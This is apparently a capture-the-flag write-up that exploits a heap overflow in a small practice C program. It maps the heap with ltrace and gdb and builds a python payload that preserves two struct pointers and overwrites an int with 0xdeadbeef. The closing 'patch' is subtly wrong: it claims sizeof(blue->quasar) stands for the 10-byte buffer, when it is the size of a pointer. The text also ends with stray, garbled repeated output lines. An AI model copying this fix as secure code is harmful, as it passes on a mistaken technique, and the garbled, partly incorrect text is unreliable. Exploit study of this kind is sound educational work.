Let's take a look at the source code...

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct vaccum	
{
	char* quasar;
	int asteroid; 
};

int main(int argc, char **argv)
{
	struct vaccum *blue, *red, *yellow;

	blue = malloc(sizeof(struct vaccum));
	blue->quasar = malloc(10);
	blue->asteroid = 15;

	
	red = malloc(sizeof(struct vaccum));
	red->quasar = malloc(10);
	red->asteroid = 43;
	
	yellow = malloc(sizeof(struct vaccum));
	yellow->quasar = malloc(10);
	yellow->asteroid = 10;	

	strcpy(red->quasar, "4.367");
	strcpy(yellow->quasar, "far far away");
	fgets(blue->quasar, 100, stdin);
	
	printf("Alpha Centari is %s light years away.\n", red->quasar);
	printf("The center of the milky way galaxy is %s.\n", yellow->quasar);
	printf("The asteroid is %d parsecs away.\n", yellow->asteroid);

	if (yellow->asteroid == 0xdeadbeef)
	{
		printf("It's funny how much a researcher can tell from light. Level Cleared!\n");
	}

	printf("Imagine how long it will be, untill a researcher that is working hard is living on Mars. You wouldn't know since your not researching.\n");
}
```

So right off the batm we can see the vulnerabillity. There is a fgets call which will allow 100 characters in, for a 10 character space. That is what we will use to overflow the heap. Looking on later in the program, we see that we will need to set the int yellow->asteroid equal to the hex string 0xdeadbeef. We can accomplish this using the heap overflow exploit we saw earlier with the fgets call. However there are a couple of curve ballls here. We see that along our way of overflowing it, we will overflow other pointers which are called via printf functions right before the if then statement. If we oveflow these with an address that is not legitamite, the programm will try to access memory that does not belong to the program and as a result have a semgentation fault and close. Let's take a look at the heap space using ltrace to get a better picture (all ltrace does is it traces library calls).

```
guyinatuxedo@tux:/Hackery/escape/heap_exp/h2$ ltrace ./h2
__libc_start_main(0x80484cb, 1, 0xffffd114, 0x8048630 <unfinished ...>
malloc(8)                                        = 0x804b008
malloc(10)                                       = 0x804b018
malloc(8)                                        = 0x804b028
malloc(10)                                       = 0x804b038
malloc(8)                                        = 0x804b048
malloc(10)                                       = 0x804b058
fgets(deadbeef
"deadbeef\n", 100, 0xf7fb45a0)             = 0x804b018
printf("Alpha Centari is %s light years "..., "4.367"Alpha Centari is 4.367 light years away.
) = 41
printf("The center of the milky way gala"..., "far far away\t\004"The center of the milky way galaxy is far far away	.
) = 54
printf("The asteroid is %d parsecs away."..., 10The asteroid is 10 parsecs away.
) = 33
puts("Imagine how long it will be, unt"...Imagine how long it will be, untill a researcher that is working hard is living on Mars. You wouldn't know since your not researching.
)      = 135
+++ exited (status 0) +++
```

So from that output, we can see our space allocated in the heap via calls to malloc.

```
malloc(8)                                        = 0x804b008
malloc(10)                                       = 0x804b018
malloc(8)                                        = 0x804b028
malloc(10)                                       = 0x804b038
malloc(8)                                        = 0x804b048
malloc(10)                                       = 0x804b058
```

First off we see that the mallocs used to initialize the structures blue, red, and yellow are 8 bytes unlike the previous challenge. This is because the structs are now also storing an int alongside a pointer, which is 4 bytes long. So the four bytes from the int and the four bytes from the pointer come together to make 8 bytes. Since the sequence the spaces are allocated in depends on the sequence that the malloc calls are made, we can assume that our input starts at 0x804b018. From this, we can also tell that the target we need to overwrite is the int located at 0x804b048, which will be in the 4 bytes after the first 4 bytes (since that is occupied by the pointer). Based upon our previous assumptions pointers that reside in the first 4 bytes (because when the struct was declared the pointer was before the int) of 0x804b028, and 0x804b028 will be called in two seperate printf statments after our overflow so we need to make sure those address point to a valid memory addres (i'm just going to rewrite it to be the same) otherwise the program will crash. Now we've made a lot of assumptions, let's prove themm by analyzing the data in gdb then map out exactly what heap locations contain what.

```
gdb-peda$ disas main
Dump of assembler code for function main:
   0x080484cb <+0>:	lea    ecx,[esp+0x4]
   0x080484cf <+4>:	and    esp,0xfffffff0
   0x080484d2 <+7>:	push   DWORD PTR [ecx-0x4]
   0x080484d5 <+10>:	push   ebp
   0x080484d6 <+11>:	mov    ebp,esp
   0x080484d8 <+13>:	push   ecx
   0x080484d9 <+14>:	sub    esp,0x14
   0x080484dc <+17>:	sub    esp,0xc
   0x080484df <+20>:	push   0x8
   0x080484e1 <+22>:	call   0x8048390 <malloc@plt>
   0x080484e6 <+27>:	add    esp,0x10
   0x080484e9 <+30>:	mov    DWORD PTR [ebp-0xc],eax
   0x080484ec <+33>:	sub    esp,0xc
   0x080484ef <+36>:	push   0xa
   0x080484f1 <+38>:	call   0x8048390 <malloc@plt>
   0x080484f6 <+43>:	add    esp,0x10
   0x080484f9 <+46>:	mov    edx,eax
   0x080484fb <+48>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080484fe <+51>:	mov    DWORD PTR [eax],edx
   0x08048500 <+53>:	mov    eax,DWORD PTR [ebp-0xc]
   0x08048503 <+56>:	mov    DWORD PTR [eax+0x4],0xf
   0x0804850a <+63>:	sub    esp,0xc
   0x0804850d <+66>:	push   0x8
   0x0804850f <+68>:	call   0x8048390 <malloc@plt>
   0x08048514 <+73>:	add    esp,0x10
   0x08048517 <+76>:	mov    DWORD PTR [ebp-0x10],eax
   0x0804851a <+79>:	sub    esp,0xc
   0x0804851d <+82>:	push   0xa
   0x0804851f <+84>:	call   0x8048390 <malloc@plt>
   0x08048524 <+89>:	add    esp,0x10
   0x08048527 <+92>:	mov    edx,eax
   0x08048529 <+94>:	mov    eax,DWORD PTR [ebp-0x10]
   0x0804852c <+97>:	mov    DWORD PTR [eax],edx
   0x0804852e <+99>:	mov    eax,DWORD PTR [ebp-0x10]
   0x08048531 <+102>:	mov    DWORD PTR [eax+0x4],0x2b
   0x08048538 <+109>:	sub    esp,0xc
   0x0804853b <+112>:	push   0x8
   0x0804853d <+114>:	call   0x8048390 <malloc@plt>
   0x08048542 <+119>:	add    esp,0x10
   0x08048545 <+122>:	mov    DWORD PTR [ebp-0x14],eax
   0x08048548 <+125>:	sub    esp,0xc
   0x0804854b <+128>:	push   0xa
   0x0804854d <+130>:	call   0x8048390 <malloc@plt>
   0x08048552 <+135>:	add    esp,0x10
   0x08048555 <+138>:	mov    edx,eax
   0x08048557 <+140>:	mov    eax,DWORD PTR [ebp-0x14]
   0x0804855a <+143>:	mov    DWORD PTR [eax],edx
   0x0804855c <+145>:	mov    eax,DWORD PTR [ebp-0x14]
   0x0804855f <+148>:	mov    DWORD PTR [eax+0x4],0xa
   0x08048566 <+155>:	mov    eax,DWORD PTR [ebp-0x10]
   0x08048569 <+158>:	mov    eax,DWORD PTR [eax]
   0x0804856b <+160>:	mov    DWORD PTR [eax],0x36332e34
   0x08048571 <+166>:	mov    WORD PTR [eax+0x4],0x37
   0x08048577 <+172>:	mov    eax,DWORD PTR [ebp-0x14]
   0x0804857a <+175>:	mov    eax,DWORD PTR [eax]
   0x0804857c <+177>:	mov    DWORD PTR [eax],0x20726166
   0x08048582 <+183>:	mov    DWORD PTR [eax+0x4],0x20726166
   0x08048589 <+190>:	mov    DWORD PTR [eax+0x8],0x79617761
   0x08048590 <+197>:	mov    BYTE PTR [eax+0xc],0x0
   0x08048594 <+201>:	mov    edx,DWORD PTR ds:0x804a040
   0x0804859a <+207>:	mov    eax,DWORD PTR [ebp-0xc]
   0x0804859d <+210>:	mov    eax,DWORD PTR [eax]
   0x0804859f <+212>:	sub    esp,0x4
   0x080485a2 <+215>:	push   edx
   0x080485a3 <+216>:	push   0x64
   0x080485a5 <+218>:	push   eax
   0x080485a6 <+219>:	call   0x8048380 <fgets@plt>
   0x080485ab <+224>:	add    esp,0x10
   0x080485ae <+227>:	mov    eax,DWORD PTR [ebp-0x10]
   0x080485b1 <+230>:	mov    eax,DWORD PTR [eax]
   0x080485b3 <+232>:	sub    esp,0x8
   0x080485b6 <+235>:	push   eax
   0x080485b7 <+236>:	push   0x80486b0
   0x080485bc <+241>:	call   0x8048370 <printf@plt>
   0x080485c1 <+246>:	add    esp,0x10
   0x080485c4 <+249>:	mov    eax,DWORD PTR [ebp-0x14]
   0x080485c7 <+252>:	mov    eax,DWORD PTR [eax]
   0x080485c9 <+254>:	sub    esp,0x8
   0x080485cc <+257>:	push   eax
   0x080485cd <+258>:	push   0x80486d8
   0x080485d2 <+263>:	call   0x8048370 <printf@plt>
   0x080485d7 <+268>:	add    esp,0x10
   0x080485da <+271>:	mov    eax,DWORD PTR [ebp-0x14]
   0x080485dd <+274>:	mov    eax,DWORD PTR [eax+0x4]
   0x080485e0 <+277>:	sub    esp,0x8
   0x080485e3 <+280>:	push   eax
   0x080485e4 <+281>:	push   0x8048704
   0x080485e9 <+286>:	call   0x8048370 <printf@plt>
   0x080485ee <+291>:	add    esp,0x10
   0x080485f1 <+294>:	mov    eax,DWORD PTR [ebp-0x14]
   0x080485f4 <+297>:	mov    eax,DWORD PTR [eax+0x4]
   0x080485f7 <+300>:	cmp    eax,0xdeadbeef
   0x080485fc <+305>:	jne    0x804860e <main+323>
   0x080485fe <+307>:	sub    esp,0xc
   0x08048601 <+310>:	push   0x8048728
   0x08048606 <+315>:	call   0x80483a0 <puts@plt>
   0x0804860b <+320>:	add    esp,0x10
   0x0804860e <+323>:	sub    esp,0xc
   0x08048611 <+326>:	push   0x8048770
   0x08048616 <+331>:	call   0x80483a0 <puts@plt>
   0x0804861b <+336>:	add    esp,0x10
   0x0804861e <+339>:	mov    eax,0x0
   0x08048623 <+344>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x08048626 <+347>:	leave  
   0x08048627 <+348>:	lea    esp,[ecx-0x4]
   0x0804862a <+351>:	ret    
End of assembler dump.
gdb-peda$ b *main+219
Breakpoint 1 at 0x80485a6
gdb-peda$ r
```

One wall of text later...

```
Breakpoint 1, 0x080485a6 in main ()
gdb-peda$ x/2w 0x804b048
0x804b048:	0x0804b058	0x0000000a
gdb-peda$ x/2w 0x804b028
0x804b028:	0x0804b038	0x0000002b
gdb-peda$ x/s 0x804b038
0x804b038:	"4.367"
gdb-peda$ x/s 0x804b058
0x804b058:	"far far away"
gdb-peda$ b *main+224
Breakpoint 2 at 0x80485ab
gdb-peda$ c
Continuing.
75395128         
```

Keep in mind that 0xa is hex for 10, and 0x2b is hex for 43. One wall of text later...

```
Breakpoint 2, 0x080485ab in main ()
gdb-peda$ x/2w 0x804b008
0x804b008:	0x0804b018	0x0000000f
gdb-peda$ x/s 0x804b018
0x804b018:	"75395128\n"
gdb-peda$ c
```

So our predictions held true (keep in mind that 0xf is hex for the decimal 15). So using our previous claims, our knowledge of how the heap works (see previous challenge for more detail), and analyzing the actual code itself and comparing the positions of the malloc calls to that of the alloated heap spaces (since they are both in the same order) we can have the following heap mapping.

```
0x804b008:	stores a pointer to 0x804b018 in first 4 bytes, and the int 15 in the second four bytes
0x804b018:	stores the address to space which stores our input, only 10 bytes long
0x804b028:	stores a pointer to 0x804b038 in first 4 bytes, and the int 43 in the second four bytes
0x804b038:	stores the address to space that is 10 bytes long that holds the string "4.367" after the first strcpy function writes to it
0x804b048:	stores a pointer to 0x804b058 in first four bytes and the int 10 in the second four bytes
0x804b058:	stores the address to space 10 bytes long, after second strcpy function writes to it it has the value "far far away"
```

So now that we have the mapping, it makes pur job so much easier. Now to construct the payload, however we will do it in parts. the first part involves overflowing the pointer stored at 0x804b028. Let's figure out the offset.

```
>>> 0x804b028 - 0x804b018
16
```

So the first 4 characters we write after the first 16 characters, will be interpreted as the pointer. Let's try to input 17 characters just to see if that holds true (it just break).

```
guyinatuxedo@tux:/Hackery/escape/heap_exp/h2$ python -c 'print "0"*17' | ./h2
Segmentation fault (core dumped)
```

Just as expected. Now let's right 16 characters, followed by the address that is supposed to be there, 0x804b038. This way it shouldn't break.

```
guyinatuxedo@tux:/Hackery/escape/heap_exp/h2$ python -c 'print "0"*16 + "\x38\xb0\x04\x08"' | ./h2
Alpha Centari is 4.367 light years away..
The asteroid is 10 parsecs away.
Imagine how long it will be, untill a researcher that is working hard is living on Mars. You wouldn't know since your not researching.
```

So that is the first pointer we have to worry about. The second is in the first four bytes of 0x804b048. Since we are four bytes past 0x804b028 already, let's figure out the offset.

```
>>> 0x804b048 - 0x804b028
32
>>> 32 - 4
28
```

So 28 characters past our current location, we should need to write the address 0x804b058 (or another functioning address) in order for the program to properly function. Let's try it.

```
guyinatuxedo@tux:/Hackery/escape/heap_exp/h2$ python -c 'print "0"*16 + "\x38\xb0\x04\x08" + "0"*28 + "\x58\xb0\x04\x08"' | ./h2
Alpha Centari is 0000000000000000X�
 light years away..
The asteroid is 10 parsecs away.
Imagine how long it will be, untill a researcher that is working hard is living on Mars. You wouldn't know since your not researching.
```

It worked, we managed to not disturb the pointers with our oveflow. Now with our exploit, we are right where the value that is being evaluated yellow->asteroid is being stored. So we should just be able to overwrite it with the hex string 0xdeadbeef, and we should pwn the challenge.

```
guyinatuxedo@tux:/Hackery/escape/heap_exp/h2$ python -c 'print "0"*16 + "\x38\xb0\x04\x08" + "0"*28 + "\x58\xb0\x04\x08" + "\xef\xbe\xad\xde"' | ./h2
Alpha Centari is 0000000000000000X�ﾭ�
 light years away..
The asteroid is -559038737 parsecs away.
It's funny how much a researcher can tell from light. Level Cleared!
Imagine how long it will be, untill a researcher that is working hard is living on Mars. You wouldn't know since your not researching.
```

Just like that we pwned the binary. Now to patch it (just like a stack overflow exploit).

```
guyinatuxedo@tux:/Hackery/escape/heap_exp/h2$ cat h2_secure.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct vaccum	
{
	char* quasar;
	int asteroid; 
};

int main(int argc, char **argv)
{
	struct vaccum *blue, *red, *yellow;

	blue = malloc(sizeof(struct vaccum));
	blue->quasar = malloc(10);
	blue->asteroid = 15;

	
	red = malloc(sizeof(struct vaccum));
	red->quasar = malloc(10);
	red->asteroid = 43;
	
	yellow = malloc(sizeof(struct vaccum));
	yellow->quasar = malloc(10);
	yellow->asteroid = 10;	

	strcpy(red->quasar, "4.367");
	strcpy(yellow->quasar, "far far away");
	fgets(blue->quasar, sizeof(blue->quasar), stdin);
	
	printf("Alpha Centari is %s light years away.\n", red->quasar);
	printf("The center of the milky way galaxy is %s.\n", yellow->quasar);
	printf("The asteroid is %d parsecs away.\n", yellow->asteroid);

	if (yellow->asteroid == 0xdeadbeef)
	{
		printf("It's funny how much a researcher can tell from light. Level Cleared!\n");
	}

	printf("Imagine how long it will be, untill a researcher that is working hard is living on Mars. You wouldn't know since your not researching.\n");
}
```

As you can see, the only thing we changed was the input fgets was allowing in from 100 to sizeof(blue->quasar) (we put sizeof() instead of 10, that way if we ever increase or decrease the space pointed to by blue->quasar we don't have to worry about changing it here). Let's test it...

```
guyinatuxedo@tux:/Hackery/escape/heap_exp/h2$ python -c 'print "0"*100' | ./h2_secure 
Alpha Centari is 4.367 light years away..
The asteroid is 10 parsecs away.
Imagine how long it will be, untill a researcher that is working hard is living on Mars. You wouldn't know since your not researching.
```

As you can see, the heap overflow exploit no longer works in it's previous form. Just like that we patched the binary.
The center of the milky way galaxy is far far away	
The center of the milky way galaxy is far far away	
The center of the milky way galaxy is far far away	The center of the milky way galaxy is far far away	
